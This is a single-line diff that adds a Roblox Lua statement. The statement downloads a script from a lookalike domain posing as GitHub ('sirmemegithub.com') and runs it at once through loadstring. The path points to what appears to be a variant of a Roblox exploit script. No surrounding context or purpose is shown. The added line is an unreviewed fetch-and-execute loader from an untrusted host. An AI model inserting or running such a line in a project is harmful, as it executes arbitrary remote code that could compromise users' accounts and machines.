@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://sirmemegithub.com/RealSlimShady2000/InfiniteYield420Edition/raw/main/source.lua"))()
